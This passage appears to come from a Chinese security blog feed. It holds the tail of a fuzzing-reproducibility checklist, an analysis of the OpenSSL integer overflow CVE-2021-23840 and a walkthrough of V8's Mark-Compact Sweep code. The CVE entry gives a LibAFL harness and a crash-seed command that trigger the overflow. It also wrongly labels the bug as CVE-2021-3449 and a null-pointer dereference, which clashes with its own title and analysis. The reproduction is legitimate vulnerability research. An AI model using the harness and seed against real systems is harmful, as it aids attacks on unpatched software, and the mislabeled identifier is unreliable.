<li>2.3 Document the source code</li>
<li>2.4 Document modifications&#x2F;extensions to other tools and their integration</li>
<li>2.5 Document how to run and reproduce experiments described in the paper</li>
</ul>
</li>
<li>Artifact Reusability<ul>
<li>3.1 Specify versions of all tools used</li>
<li>3.2 If possible, enable execution of your fuzzer independent of the underlying system, e.g., through virtualization or container engines</li>
<li>3.3 Avoid external dependencies that may be unavailable in the future, such as tarball downloads via https</li>
<li>3.4 Pin versions of dependencies</li>
<li>3.5 If applicable, maintain the commit history of underlying tools instead of squashing them</li>
<li>3.6 Double-check your code is complete and reusable</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-23840漏洞原理分析与复现</title>
    <url>/posts/4fd5388e.html</url>
    <content><![CDATA[<h2 id="CVE-2021-23840整数溢出漏洞"><a href="#CVE-2021-23840整数溢出漏洞" class="headerlink" title="CVE-2021-23840整数溢出漏洞"></a>CVE-2021-23840整数溢出漏洞</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>该漏洞为公开漏洞，漏洞编号为CVE-2021-3449，漏洞类型为空指针引用漏洞，存在于OpenSSL的1.1.1-1.1.1i版本，包含11.1.4目标PA设备中的开源组件OpenSSL版本1.1.1g。官方描述信息如下：</p>
<img src="/posts/4fd5388e/image-20250725093444651.png" class="" title="image-20250725093444651">

<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>比对修复版本，在修复版本增加的内容check如下：</p>
<img src="/posts/4fd5388e/image-20250717200045993.png" class="" title="image-20250717200045993">

<p>根据其注释，要求(inl-j) &amp; ~(bl -1)的值不能超过 INT_MAX - bl。</p>
<p>存在漏洞代码如下，在漏洞函数evp_EncryptDecryptUpdate内第350行进入if(i !&#x3D;0)分支，在第351行进入else分支，此时openssl会进行加密算法的padding部分，即将不是规定分组大小整数倍的长度补充到分组大小整数倍。此时会将*outl +&#x3D; bl对outl加上一个分组大小。跳出350行的if-else分支后，将输入长度除去不足分组大小的部分加到*outl中，因此如果inl本就接近INT_MAX，此时会发生整数溢出导致*outl变为INT_MAX即（0x80000000）,发生整数溢出。</p>
<p>注意触发该漏洞需要保证 i 不为0，也就是说ctx-&gt;buf不为空，那么就需要在执行EVP_EncryptUpdate前再执行一次不是分组大小整数倍的EVP_EncryptUpdate，并且需要保证inl &amp; 0xf &gt;&#x3D; j，防止作差时向上借位。</p>
<img src="/posts/4fd5388e/image-20250717202226709.png" class="" title="image-20250717202226709">

<p>构造libafl harness程序如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/evp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 条件编译 LibAFL 宏</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_LIBAFL</span></span><br><span class="line">__AFL_FUZZ_INIT();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> key[<span class="number">16</span>] = &#123;<span class="number">0x80</span>, <span class="number">0xc7</span>, <span class="number">0x9e</span>, <span class="number">0x14</span>, <span class="number">0xef</span>, <span class="number">0x09</span>, <span class="number">0xbd</span>, <span class="number">0x42</span>, <span class="number">0x0b</span>, <span class="number">0x1f</span>, <span class="number">0x80</span>, <span class="number">0x98</span>, <span class="number">0x82</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0xfd</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> iv[<span class="number">16</span>]  = &#123;<span class="number">0x80</span>, <span class="number">0xc7</span>, <span class="number">0x9e</span>, <span class="number">0x14</span>, <span class="number">0xef</span>, <span class="number">0x09</span>, <span class="number">0xbd</span>, <span class="number">0x42</span>, <span class="number">0x0b</span>, <span class="number">0x1f</span>, <span class="number">0x80</span>, <span class="number">0x98</span>, <span class="number">0x82</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0xfd</span>&#125;;</span><br><span class="line">    <span class="type">char</span> dest[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;  </span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> data_size = size;</span><br><span class="line">    <span class="keyword">if</span> (size &gt;= <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        size = ((<span class="type">uint32_t</span> *) data)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;debug.log&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">&quot;input size: %zu\n&quot;</span>, size);</span><br><span class="line">        <span class="comment">// fclose(fp);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *msg = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        msg = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> (!msg) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            msg[i] = data[i % data_size];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> EVP_CIPHER* cipher = EVP_aes_128_cbc();</span><br><span class="line">    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();</span><br><span class="line">    assert(ctx != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> out_size = size;</span><br><span class="line">    <span class="type">size_t</span> blockSize = EVP_CIPHER_block_size(cipher);</span><br><span class="line">    <span class="type">size_t</span> out_len1 = out_size + blockSize;</span><br><span class="line">    <span class="type">uint8_t</span> *out = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(out_len1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!out) &#123;</span><br><span class="line">        <span class="keyword">if</span> (msg) <span class="built_in">free</span>(msg);</span><br><span class="line">        EVP_CIPHER_CTX_free(ctx);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> len1 = <span class="number">0</span>, len2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    assert(EVP_EncryptInit_ex(ctx, cipher, <span class="literal">NULL</span>, key, iv) == <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// make ctx-&gt;buf_len != 0</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dummy_data[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;  <span class="comment">// Dummy data to populate buffer</span></span><br><span class="line">    assert(EVP_EncryptUpdate(ctx, out, &amp;len1, dummy_data, <span class="keyword">sizeof</span>(dummy_data)) == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; msg) &#123;</span><br><span class="line">        assert(EVP_EncryptUpdate(ctx, out, &amp;len1, msg, size) == <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        len1 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(EVP_EncryptFinal_ex(ctx, out + len1, &amp;len2) == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> total_len = len1 + len2;</span><br><span class="line">    <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">&quot;total_len: %zu\n&quot;</span>, total_len);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(total_len &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msg) <span class="built_in">free</span>(msg);</span><br><span class="line">    <span class="built_in">free</span>(out);</span><br><span class="line">    EVP_CIPHER_CTX_free(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* input_file = getenv(<span class="string">&quot;FUZZ_INPUT_FILE&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (input_file) &#123;</span><br><span class="line">        FILE *fp = fopen(input_file, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">        <span class="type">long</span> filesize = ftell(fp);</span><br><span class="line">        fseek(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">        <span class="keyword">if</span> (filesize &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            fclose(fp);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint8_t</span> *buf = <span class="built_in">malloc</span>(filesize);</span><br><span class="line">        <span class="keyword">if</span> (!buf) &#123;</span><br><span class="line">            fclose(fp);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fread(buf, <span class="number">1</span>, filesize, fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        LLVMFuzzerTestOneInput(buf, filesize);</span><br><span class="line">        <span class="built_in">free</span>(buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_LIBAFL</span></span><br><span class="line">    <span class="comment">// LibAFL 模式</span></span><br><span class="line">    __AFL_INIT();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf = __AFL_FUZZ_TESTCASE_BUF;</span><br><span class="line">    <span class="type">size_t</span> len = __AFL_FUZZ_TESTCASE_LEN;</span><br><span class="line">    LLVMFuzzerTestOneInput(buf, len);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">// 标准模式</span></span><br><span class="line">    <span class="type">uint8_t</span> buffer[<span class="number">65536</span>];</span><br><span class="line">    <span class="type">ssize_t</span> result = read(STDIN_FILENO, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="keyword">if</span> (result &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        LLVMFuzzerTestOneInput(buffer, result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">uint8_t</span> test_data[] = &#123;<span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>&#125;;</span><br><span class="line">        LLVMFuzzerTestOneInput(test_data, <span class="keyword">sizeof</span>(test_data));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造种子以及编译harness命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">构造crash种子</span></span><br><span class="line">echo -e -n &quot;\\xfe\\xff\\xff\\x7f&quot; &gt; huge_seeds</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">compile harness with libafl_cc</span></span><br><span class="line">&quot;$&#123;PROJECT_ROOT&#125;/target/release/libafl_cc&quot; \</span><br><span class="line">  -DUSE_LIBAFL \</span><br><span class="line">  -fsanitize=address -fsanitize=undefined -fno-sanitize-recover=undefined \</span><br><span class="line">  -I&quot;$&#123;PROJECT_ROOT&#125;/source_tests/vulnerable_openssl/openssl-1.1.1g/include&quot; \</span><br><span class="line">  &quot;$&#123;SCRIPT_DIR&#125;/harness.c&quot; \</span><br><span class="line">  -L&quot;$&#123;PROJECT_ROOT&#125;/source_tests/vulnerable_openssl/openssl-1.1.1g&quot; \</span><br><span class="line">  -lssl -lcrypto \</span><br><span class="line">  -o &quot;$&#123;SCRIPT_DIR&#125;/harness_libafl&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">start fuzz</span></span><br><span class="line">&quot;$&#123;PROJECT_ROOT&#125;/target/release/fuzzer-palo&quot; fuzz-libsource --in &quot;$&#123;SCRIPT_DIR&#125;/seeds&quot; --out &quot;$&#123;SCRIPT_DIR&#125;/outs&quot; &quot;$&#123;SCRIPT_DIR&#125;/harness_libafl&quot;</span><br></pre></td></tr></table></figure>

<p>成功触发整数溢出：</p>
<img src="/posts/4fd5388e/e3b7cae1fa08801c0a7bb51ecd9ef768.png" class="" title="e3b7cae1fa08801c0a7bb51ecd9ef768">



<p>但是fuzz时跑不出结果，因为需要申请超大内存，需要增大超时时间，保证目标程序跑完一轮后再退出。</p>
<img src="/posts/4fd5388e/image-20250718115725330.png" class="" title="image-20250718115725330">

]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Mark Compact Sweep</title>
    <url>/posts/61a1b815.html</url>
    <content><![CDATA[<p>V8的内存回收机制之Mark-Compact的Sweep功能<br>其定义位于<code>//v8/src/heap/mark-compact.cc</code>的<code>MarkCompactCollector::Sweep</code>函数：<br>完成工作：</p>
<ul>
<li>按照特定顺序清理v8堆中的各个内存空间（大对象，普通页，新生代对象）</li>
<li>检查是否为MemoryChunk::BLACK_ALLOCATED标志位，代表为存活对象，不是则进行下一步检查</li>
<li>检查是否标记过，是则代表存活，否则代表对象已死亡，需要释放；普通页以及新生代内存释放操作在evacuate阶段进行。<figure class="highlight cpp"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MarkCompactCollector::Sweep</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK</span>(!sweeper_-&gt;<span class="built_in">sweeping_in_progress</span>());</span><br><span class="line">  <span class="built_in">DCHECK</span>(queued_pages_to_be_freed_.<span class="built_in">empty</span>());</span><br><span class="line"></span><br><span class="line">  sweeper_-&gt;<span class="built_in">InitializeMajorSweeping</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">TRACE_GC_EPOCH_WITH_FLOW</span>(</span><br><span class="line">      heap_-&gt;<span class="built_in">tracer</span>(), GCTracer::Scope::MC_SWEEP, ThreadKind::kMain,</span><br><span class="line">      sweeper_-&gt;<span class="built_in">GetTraceIdForFlowEvent</span>(GCTracer::Scope::MC_SWEEP),</span><br><span class="line">      TRACE_EVENT_FLAG_FLOW_OUT);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">  state_ = SWEEP_SPACES;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">GCTracer::Scope <span class="title">sweep_scope</span><span class="params">(heap_-&gt;tracer(), GCTracer::Scope::MC_SWEEP_LO,</span></span></span><br><span class="line"><span class="params"><span class="function">                                ThreadKind::kMain)</span></span>;</span><br><span class="line">    <span class="built_in">SweepLargeSpace</span>(heap_-&gt;<span class="built_in">lo_space</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">GCTracer::Scope <span class="title">sweep_scope</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        heap_-&gt;tracer(), GCTracer::Scope::MC_SWEEP_CODE_LO, ThreadKind::kMain)</span></span>;</span><br><span class="line">    <span class="built_in">SweepLargeSpace</span>(heap_-&gt;<span class="built_in">code_lo_space</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (heap_-&gt;<span class="built_in">shared_space</span>()) &#123;</span><br><span class="line">    <span class="function">GCTracer::Scope <span class="title">sweep_scope</span><span class="params">(heap_-&gt;tracer(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                GCTracer::Scope::MC_SWEEP_SHARED_LO,</span></span></span><br><span class="line"><span class="params"><span class="function">                                ThreadKind::kMain)</span></span>;</span><br><span class="line">    <span class="built_in">SweepLargeSpace</span>(heap_-&gt;<span class="built_in">shared_lo_space</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">GCTracer::Scope <span class="title">sweep_scope</span><span class="params">(heap_-&gt;tracer(), GCTracer::Scope::MC_SWEEP_OLD,</span></span></span><br><span class="line"><span class="params"><span class="function">                                ThreadKind::kMain)</span></span>;</span><br><span class="line">    <span class="built_in">StartSweepSpace</span>(heap_-&gt;<span class="built_in">old_space</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">GCTracer::Scope <span class="title">sweep_scope</span><span class="params">(heap_-&gt;tracer(), GCTracer::Scope::MC_SWEEP_CODE,</span></span></span><br><span class="line"><span class="params"><span class="function">                                ThreadKind::kMain)</span></span>;</span><br><span class="line">    <span class="built_in">StartSweepSpace</span>(heap_-&gt;<span class="built_in">code_space</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (heap_-&gt;<span class="built_in">shared_space</span>()) &#123;</span><br><span class="line">    <span class="function">GCTracer::Scope <span class="title">sweep_scope</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        heap_-&gt;tracer(), GCTracer::Scope::MC_SWEEP_SHARED, ThreadKind::kMain)</span></span>;</span><br><span class="line">    <span class="built_in">StartSweepSpace</span>(heap_-&gt;<span class="built_in">shared_space</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">GCTracer::Scope <span class="title">sweep_scope</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        heap_-&gt;tracer(), GCTracer::Scope::MC_SWEEP_TRUSTED, ThreadKind::kMain)</span></span>;</span><br><span class="line">    <span class="built_in">StartSweepSpace</span>(heap_-&gt;<span class="built_in">trusted_space</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (heap_-&gt;<span class="built_in">shared_trusted_space</span>()) &#123;</span><br><span class="line">    <span class="function">GCTracer::Scope <span class="title">sweep_scope</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        heap_-&gt;tracer(), GCTracer::Scope::MC_SWEEP_SHARED, ThreadKind::kMain)</span></span>;</span><br><span class="line">    <span class="built_in">StartSweepSpace</span>(heap_-&gt;<span class="built_in">shared_trusted_space</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">GCTracer::Scope <span class="title">sweep_scope</span><span class="params">(heap_-&gt;tracer(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                GCTracer::Scope::MC_SWEEP_TRUSTED_LO,</span></span></span><br><span class="line"><span class="params"><span class="function">                                ThreadKind::kMain)</span></span>;</span><br><span class="line">    <span class="built_in">SweepLargeSpace</span>(heap_-&gt;<span class="built_in">trusted_lo_space</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (v8_flags.minor_ms &amp;&amp; heap_-&gt;<span class="built_in">new_space</span>()) &#123;</span><br><span class="line">    <span class="function">GCTracer::Scope <span class="title">sweep_scope</span><span class="params">(heap_-&gt;tracer(), GCTracer::Scope::MC_SWEEP_NEW,</span></span></span><br><span class="line"><span class="params"><span class="function">                                ThreadKind::kMain)</span></span>;</span><br><span class="line">    <span class="built_in">StartSweepNewSpace</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sweeper_-&gt;<span class="built_in">StartMajorSweeping</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
存在三种sweep函数</li>
<li>SweepLargeSpace：大对象空间</li>
<li>StartSweepSpace：普通分页空间</li>
<li>StartSweepNewSpace：新生代空间（如果开启minor-ms）<br>最终启动并发清理StartMajorSweeping<br>MarkCompactCollector::SweepLargeSpace，处理大对象空间：<figure class="highlight cpp"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MarkCompactCollector::SweepLargeSpace</span><span class="params">(LargeObjectSpace* space)</span> </span>&#123;</span><br><span class="line">  <span class="function">PtrComprCageBase <span class="title">cage_base</span><span class="params">(heap_-&gt;isolate())</span></span>;</span><br><span class="line">  <span class="type">size_t</span> surviving_object_size = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">bool</span> postpone_freeing = <span class="built_in">ShouldPostponeFreeingEmptyPages</span>(space);</span><br><span class="line">  <span class="type">const</span> <span class="type">bool</span> add_to_pool =</span><br><span class="line">      v8_flags.large_page_pool &amp;&amp; space-&gt;<span class="built_in">identity</span>() == NEW_LO_SPACE;</span><br><span class="line">  <span class="built_in">DCHECK_IMPLIES</span>(add_to_pool, !postpone_freeing);</span><br><span class="line">  std::vector&lt;LargePageMetadata*&gt; pages_to_pool;</span><br><span class="line">  <span class="keyword">if</span> (add_to_pool) &#123;</span><br><span class="line">    pages_to_pool.<span class="built_in">reserve</span>(space-&gt;<span class="built_in">memory_chunk_list</span>().<span class="built_in">size</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> it = space-&gt;<span class="built_in">begin</span>(); it != space-&gt;<span class="built_in">end</span>();) &#123;</span><br><span class="line">    LargePageMetadata* current = *(it++);</span><br><span class="line">    <span class="built_in">DCHECK</span>(!current-&gt;<span class="built_in">Chunk</span>()-&gt;<span class="built_in">IsFlagSet</span>(MemoryChunk::BLACK_ALLOCATED));</span><br><span class="line">    Tagged&lt;HeapObject&gt; object = current-&gt;<span class="built_in">GetObject</span>();</span><br><span class="line">    <span class="keyword">if</span> (!marking_state_-&gt;<span class="built_in">IsMarked</span>(object)) &#123;</span><br><span class="line">      <span class="comment">// Object is dead and page can be released.</span></span><br><span class="line">      space-&gt;<span class="built_in">RemovePage</span>(current);</span><br><span class="line">      <span class="keyword">if</span> (postpone_freeing) &#123;</span><br><span class="line">        queued_pages_to_be_freed_.<span class="built_in">push_back</span>(current);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (add_to_pool) &#123;</span><br><span class="line">        pages_to_pool.<span class="built_in">push_back</span>(current);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        heap_-&gt;<span class="built_in">memory_allocator</span>()-&gt;<span class="built_in">Free</span>(MemoryAllocator::FreeMode::kImmediately,</span><br><span class="line">                                        current);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!v8_flags.sticky_mark_bits) &#123;</span><br><span class="line">      MarkBit::<span class="built_in">From</span>(object).<span class="built_in">Clear</span>();</span><br><span class="line">      current-&gt;<span class="built_in">SetLiveBytes</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;<span class="built_in">marking_progress_tracker</span>().<span class="built_in">ResetIfEnabled</span>();</span><br><span class="line">    surviving_object_size += <span class="built_in">static_cast</span>&lt;<span class="type">size_t</span>&gt;(object-&gt;<span class="built_in">Size</span>(cage_base));</span><br><span class="line">  &#125;</span><br><span class="line">  space-&gt;<span class="built_in">set_objects_size</span>(surviving_object_size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (add_to_pool &amp;&amp; !pages_to_pool.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">    <span class="built_in">heap</span>()-&gt;<span class="built_in">memory_allocator</span>()-&gt;<span class="built_in">FreeLargePagesPooled</span>(std::<span class="built_in">move</span>(pages_to_pool));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>MarkCompactCollector::StartSweepSpace函数，处理普通页：</p>
<figure class="highlight cpp"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MarkCompactCollector::StartSweepSpace</span><span class="params">(PagedSpace* space)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_NE</span>(NEW_SPACE, space-&gt;<span class="built_in">identity</span>());</span><br><span class="line">  space-&gt;<span class="built_in">ClearAllocatorState</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> will_be_swept = <span class="number">0</span>;</span><br><span class="line">  <span class="type">bool</span> unused_page_present = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  Sweeper* sweeper = heap_-&gt;<span class="built_in">sweeper</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Loop needs to support deletion if live bytes == 0 for a page.</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> it = space-&gt;<span class="built_in">begin</span>(); it != space-&gt;<span class="built_in">end</span>();) &#123;</span><br><span class="line">    PageMetadata* p = *(it++);</span><br><span class="line">    <span class="built_in">DCHECK</span>(p-&gt;<span class="built_in">SweepingDone</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;<span class="built_in">Chunk</span>()-&gt;<span class="built_in">IsEvacuationCandidate</span>()) &#123;</span><br><span class="line">      <span class="built_in">DCHECK</span>(!p-&gt;<span class="built_in">Chunk</span>()-&gt;<span class="built_in">IsFlagSet</span>(MemoryChunk::BLACK_ALLOCATED));</span><br><span class="line">      <span class="built_in">DCHECK_NE</span>(NEW_SPACE, space-&gt;<span class="built_in">identity</span>());</span><br><span class="line">      <span class="comment">// Will be processed in Evacuate.</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the page is black, just reset the flag and don&#x27;t add the page to the</span></span><br><span class="line">    <span class="comment">// sweeper.</span></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;<span class="built_in">Chunk</span>()-&gt;<span class="built_in">IsFlagSet</span>(MemoryChunk::BLACK_ALLOCATED)) &#123;</span><br><span class="line">      <span class="built_in">ResetAndRelinkBlackAllocatedPage</span>(space, p);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// One unused page is kept, all further are released before sweeping them.</span></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;<span class="built_in">live_bytes</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (unused_page_present) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v8_flags.gc_verbose) &#123;</span><br><span class="line">          <span class="built_in">PrintIsolate</span>(heap_-&gt;<span class="built_in">isolate</span>(), <span class="string">&quot;sweeping: released page: %p&quot;</span>,</span><br><span class="line">                       <span class="built_in">static_cast</span>&lt;<span class="type">void</span>*&gt;(p));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">ReleasePage</span>(space, p);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      unused_page_present = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sweeper-&gt;<span class="built_in">AddPage</span>(space-&gt;<span class="built_in">identity</span>(), p);</span><br><span class="line">    will_be_swept++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (v8_flags.sticky_mark_bits &amp;&amp; space-&gt;<span class="built_in">identity</span>() == OLD_SPACE) &#123;</span><br><span class="line">    <span class="built_in">static_cast</span>&lt;StickySpace*&gt;(space)-&gt;<span class="built_in">set_old_objects_size</span>(space-&gt;<span class="built_in">Size</span>());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (v8_flags.gc_verbose) &#123;</span><br><span class="line">    <span class="built_in">PrintIsolate</span>(heap_-&gt;<span class="built_in">isolate</span>(),</span><br><span class="line">                 <span class="string">&quot;sweeping: space=%s initialized_for_sweeping=%d&quot;</span>,</span><br><span class="line">                 <span class="built_in">ToString</span>(space-&gt;<span class="built_in">identity</span>()), will_be_swept);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
